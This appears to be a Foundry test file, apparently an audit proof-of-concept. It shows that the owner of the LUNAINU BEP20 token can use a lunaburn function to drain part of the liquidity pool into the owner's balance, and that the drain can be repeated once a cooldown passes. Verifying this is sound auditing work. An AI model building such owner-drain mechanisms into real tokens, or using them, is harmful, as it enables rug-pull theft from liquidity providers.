// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/BEP20LUNAINU.sol";

contract MockWETH {
    function deposit() external payable {}
    function transfer(address, uint256) external pure returns (bool) { return true; }
}

contract MockPair {
    function sync() external {
        // Empty implementation for testing
    }
}

contract MockFactory {
    MockPair public immutable fakePair;

    constructor(MockPair _pair) {
        fakePair = _pair;
    }

    function createPair(address, address) external view returns (address) {
        return address(fakePair);
    }
}

contract MockRouter {
    address public immutable WETH;
    address public immutable factoryContract;

    constructor(address _weth, address _factory) {
        WETH = _weth;
        factoryContract = _factory;
    }
    
    function factory() external view returns (address) {
        return factoryContract;
    }
}

contract LunaInuTest is Test {
    BEP20LUNAINU token;
    address owner = address(0x1);
    address routerAddr = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    MockRouter mockRouter;
    MockFactory mockFactory;
    MockPair mockPair;
    MockWETH mockWETH;

    function setUp() public {
        // Deploy mock contracts
        mockWETH = new MockWETH();
        mockPair = new MockPair();
        mockFactory = new MockFactory(mockPair);
        mockRouter = new MockRouter(address(mockWETH), address(mockFactory));
        
        // Overwrite router address with mock bytecode
        vm.etch(routerAddr, address(mockRouter).code);
        
        // Deploy token as owner
        vm.startPrank(owner);
        token = new BEP20LUNAINU();
        vm.stopPrank();
        
        // Set token balance for pair and owner
        address pairAddress = token.pair();
        deal(address(token), pairAddress, 1000 ether);
        deal(address(token), owner, 100 ether);
        
        // Warp time to bypass initial cooldown
        vm.warp(block.timestamp + 121 seconds);
    }

    function testLunaBurnDrainsLiquidity() public {
        address pairAddress = token.pair();
        
        console2.log("--- BEFORE-Trigger Operation ---");
        uint256 initialOwnerBalance = token.balanceOf(owner);
        uint256 initialPairBalance = token.balanceOf(pairAddress);
        console2.log("Initial owner balance:", initialOwnerBalance);
        console2.log("Initial pair balance:", initialPairBalance);
        assertGt(initialPairBalance, 0, "LP tokens not set");

        console2.log("--- Trigger Operation (lunaburn) ---");
        // Owner can drain 5% of LP
        vm.prank(owner);
        token.lunaburn(50); // 5% of LP

        console2.log("--- AFTER-Trigger Operation ---");
        uint256 ownerBalanceAfter = token.balanceOf(owner);
        uint256 pairBalanceAfter = token.balanceOf(pairAddress);
        console2.log("Owner balance after:", ownerBalanceAfter);
        console2.log("Pair balance after:", pairBalanceAfter);

        uint256 expectedDeduction = initialPairBalance * 50 / 1000;
        uint256 ownerGain = ownerBalanceAfter - initialOwnerBalance;
        uint256 pairLoss = initialPairBalance - pairBalanceAfter;
        
        console2.log("Owner gain:", ownerGain);
        console2.log("Pair loss:", pairLoss);
        console2.log("Expected deduction:", expectedDeduction);

        // Vulnerability verdict
        bool vulnExists = (ownerGain == expectedDeduction) && 
                          (pairLoss == expectedDeduction);
        if (vulnExists) {
            console2.log("Vulnerability Exists: Owner successfully drained liquidity pool");
        } else {
            console2.log("Vulnerability not Exist: Liquidity drain did not occur as expected");
        }

        assertEq(pairBalanceAfter, initialPairBalance - expectedDeduction, "LP tokens not drained");
        assertEq(ownerBalanceAfter, initialOwnerBalance + expectedDeduction, "Owner didn't receive tokens");

        // Subsequent immediate call should fail
        vm.prank(owner);
        vm.expectRevert("Too soon");
        token.lunaburn(50);
    }

    function testLunaBurnTimeLockBypass() public {
        address pairAddress = token.pair();
        
        console2.log("--- BEFORE-All Triggers ---");
        uint256 initialOwnerBalance = token.balanceOf(owner);
        uint256 initialPairBalance = token.balanceOf(pairAddress);
        console2.log("Initial owner balance:", initialOwnerBalance);
        console2.log("Initial pair balance:", initialPairBalance);
        
        console2.log("--- Trigger First Drain ---");
        // First drain
        vm.prank(owner);
        token.lunaburn(50);
        uint256 firstDeduction = initialPairBalance * 50 / 1000;

        console2.log("--- AFTER First Drain ---");
        uint256 afterFirstOwner = token.balanceOf(owner);
        uint256 afterFirstPair = token.balanceOf(pairAddress);
        console2.log("Owner after first drain:", afterFirstOwner);
        console2.log("Pair after first drain:", afterFirstPair);
        
        // Fast-forward beyond cooldown
        console2.log("--- Time Warp (121s) ---");
        vm.warp(block.timestamp + 121 seconds);
        
        console2.log("--- BEFORE Second Trigger ---");
        console2.log("Owner before second drain:", afterFirstOwner);
        console2.log("Pair before second drain:", afterFirstPair);
        
        console2.log("--- Trigger Second Drain ---");
        // Second drain
        vm.prank(owner);
        token.lunaburn(50); 
        uint256 secondDeduction = (initialPairBalance - firstDeduction) * 50 / 1000;

        console2.log("--- AFTER Second Trigger ---");
        uint256 finalOwnerBalance = token.balanceOf(owner);
        uint256 finalPairBalance = token.balanceOf(pairAddress);
        console2.log("Final owner balance:", finalOwnerBalance);
        console2.log("Final pair balance:", finalPairBalance);

        uint256 totalOwnerGain = finalOwnerBalance - initialOwnerBalance;
        uint256 totalPairLoss = initialPairBalance - finalPairBalance;
        
        console2.log("Total owner gain:", totalOwnerGain);
        console2.log("Total pair loss:", totalPairLoss);
        console2.log("Expected total deduction:", firstDeduction + secondDeduction);

        // Vulnerability verdict
        bool vulnExists = (totalOwnerGain == firstDeduction + secondDeduction) &&
                          (totalPairLoss == firstDeduction + secondDeduction);
        if (vulnExists) {
            console2.log("Vulnerability Exists: Owner bypassed cooldown to drain liquidity twice");
        } else {
            console2.log("Vulnerability not Exist: Cooldown bypass/double drain failed");
        }

        assertEq(finalPairBalance, initialPairBalance - firstDeduction - secondDeduction, "LP drained multiple times");
        assertEq(finalOwnerBalance, initialOwnerBalance + firstDeduction + secondDeduction, "Multiple transfers to owner");
    }
}